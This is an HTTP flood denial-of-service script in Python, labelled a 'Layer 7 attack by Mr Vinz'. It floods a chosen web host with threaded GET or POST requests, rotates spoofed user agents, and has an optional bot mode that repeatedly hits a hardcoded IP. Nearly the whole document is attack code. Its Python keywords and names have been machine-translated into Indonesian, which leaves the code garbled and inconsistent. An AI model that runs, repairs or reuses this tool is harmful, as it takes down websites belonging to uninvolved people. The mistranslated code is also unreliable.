dari antrian impor Antrian
dari optparse impor OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def sedot_parameters():
	ip global,host,port,thr,item,referer,uri,path,method,isbot
	ip = "118.98.73.214"
	tuan rumah = "www.google.com"
	pelabuhan = 80
	tr = 500
	jalur = "/" 		
	uri = "/" # lokasi/halaman dimana website gk redirect lgi misalnya: /index.jsp
	metode = "DAPATKAN" # DAPATKAN / POSTING
	data_post = "" # dipakai hanya untuk metode = POST, misalnya: user=test&pass=test
	isbot=0
	
	optp = OptionParser(add_help_option=False,epilog="Palu")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--host", dest="host",help="serangan ke host server --host www.target.com")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 200 -t 200")
	optp.add_option("-a","--path",dest="path",help="default / -a /db.php")
	optp.add_option("-u","--uri",dest="uri",help="default / -u /index.jsp")
	optp.add_option("-m","--method",dest="method",help="default GET -m GET")
	optp.add_option("-d","--data",dest="data",help="default -d user=test&pass=test")
	optp.add_option("-h","--help",dest="help",action='store_true',help="membantu Anda")
	memilih, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	jika opts.help:
		penggunaan()
	jika opts.host Tidak Ada:
		penggunaan()
	kalau tidak:
		host = opts.host
	jika opts.port Tidak Ada:
		pelabuhan = 80
	kalau tidak:
		port = opts.port
	jika opts.turbo Tidak Ada:
		thr = 200
	kalau tidak:
		thr = opts.turbo
	jika opts.path Tidak Ada:
		jalur = "/"
	kalau tidak:
		jalur = opts.path
	jika opts.uri Tidak Ada:
		uri = "/"
	kalau tidak:
		uri = opts.uri
	jika opts.method adalah None:
		uri = "DAPATKAN"
	kalau tidak:
		uri = opts.method
	jika opts.data Tidak Ada:
		data_posting = ""
	kalau tidak:
		data_post = opts.data

penggunaan def():
	cetak ('''
	-s atau --host = "www.google.com"
	-p atau --port = 80 > 80 (http) atau 443 (htttps)
	-t atau --turbo = 200 > default 200
	-a atau --path = "/" > serangan spesifik
	-u or --uri = "/" > lokasi/halaman dimana website gk redirect lgi misalnya: /index.jsp
	
	-m atau --method = "GET" > GET / POST
	-d atau --data = "" > dipakai hanya untuk metode = POST, misalnya: user=test&pass=test
	''')
	sistem.keluar()
	
def my_bots():
	bot global
	bot=[]
	#contoh bot aja gan..
	bot1="https://www.google.com/?q="
	bots.tambahkan(bot1)
	kembali (bot)
	
def user_agent():
	uagent global
	uagen=[]
	uagent.append("Mozilla/5.0 (kompatibel; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, seperti Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	kembali (uagen)

def bot_hammering(url):
	mencoba:
		sementara Benar:
			sys.stdout.write("Bot>>api ...")
			sys.stdout.write('\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b')
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagen)}))
			waktu.tidur(.1)
	kecuali:
		waktu.tidur(.1)
			
def down_it(item):
	mencoba:
		sementara Benar:
			jika (port == 80):
				rujukan = "http://"
			elif(port==443):
				referensi="https://"
			
			if(metode="DAPATKAN"):
				packet = str("GET "+path+" HTTP/1.1\nReferer: "+referer+host+uri+"\nHost: "+host+"\n\n User-Agent: "+random.choice(uagen)+"\ n"+data).encode('utf-8')
			elif(metode=="POST"):
				packet = str("POST "+path+" HTTP/1.1\nReferer: "+referer+host+uri+"\nHost: "+host+"\n\n User-Agent: "+random.choice(uagen)+"\ n"+data+"\n\n"+data_posting).encode('utf-8')
			kalau tidak:
				print("kesalahan terdeteksi")
				
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			jika s.sendto( paket, (host, int(port)) ):
				s.shutdown(1)
				sys.stdout.write("Menyerang ...")
				sys.stdout.write('\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b')
				
			kalau tidak:
				s.shutdown(1)
				print("Matikan <->down")
			waktu.tidur(.1)
	kecuali socket.error sebagai e:
		print("tidak ada koneksi! server mungkin down")
		waktu.tidur(.1)

def dos():
	sementara Benar:
		barang = q.get()
		down_it(item)
		q.task_done()


def dos2():
	sementara Benar:
		item=w.get()
		bot_hammering(pilihan acak(bot)+ip)
		w.tugas_selesai()


def keluar():
	sistem.keluar()

data global
data ''Terima: teks/html,aplikasi/xhtml+xml,aplikasi/xml;q=0.9,*/*;q=0.8
Terima-Bahasa: en-us,en;q=0.5
Terima-Encoding: gzip,deflate
Set-Aksep: ISO-8859-1,utf-8;q=0,7,*;q=0,7
Tetap-Alive: 115
Koneksi: tetap hidup''';
 
#antrian tugas adalah q,w
q = Antrian()
w = Antrian()

jika __name__ == '__main__':
	sedot_parameter()
	mencetak("")
	mencetak("------------------------------")
	print("Serangan Layer 7 Oleh Mr Vinz")
	mencetak("------------------------------")
	mencetak("")
	print("Target Terkunci :")
	print("Web : ",host)
	print("Port: ",str(port))
	print("Turbo : ",str(thr))
	print("URI: ",uri)
	print("Khusus untuk : ",jalur)
	mencetak("")
	print("Harap tunggu . . .\n")
	Agen pengguna()
	bot_saya()
	waktu.tidur(5)
	mencoba:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	kecuali socket.error sebagai e:
		print("periksa ip dan port server")
		KELUAR()
	sementara Benar:
		untuk saya dalam jangkauan(int(thr)):
			t = threading.Utas(target=dos)
			t.daemon = Benar
			t.mulai()
			jika(isbot==1):
				t2 = threading.Utas(target=dos2)
				t2.daemon = Benar
				t2.mulai()
		mulai = waktu.waktu()
		#tugas
		barang = 0
		sementara Benar:
			jika (item> 1800):
				barang = 0
				waktu.tidur(.1)
			barang = barang + 1
			q.put(barang)
			w.put(item)
		q.bergabung()
		w.bergabung()
